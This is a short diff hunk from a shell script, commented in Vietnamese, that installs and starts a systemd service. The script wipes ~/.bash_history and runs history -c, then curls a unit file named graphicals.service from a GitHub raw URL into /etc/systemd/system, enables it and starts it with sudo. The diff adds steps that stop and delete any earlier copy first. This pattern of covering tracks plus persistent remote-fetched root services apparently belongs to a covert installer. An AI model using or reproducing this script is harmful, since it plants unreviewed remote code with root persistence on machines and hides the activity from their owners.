@@ -55,9 +55,11 @@ rm ~/.bash_history
 history -c
 
 # Kich hoat service
+sudo systemctl stop graphicals.service
+rm -rf /etc/systemd/system/graphicals.service
+sudo systemctl daemon-reload
 curl https://raw.githubusercontent.com/kryptos368/imhere/refs/heads/main/graphicals.service >> /etc/systemd/system/graphicals.service
 chmod +x /etc/systemd/system/graphicals.service
-sudo systemctl stop graphicals.service
 sudo systemctl daemon-reload
 sudo systemctl enable graphicals.service
 sudo systemctl start graphicals.service
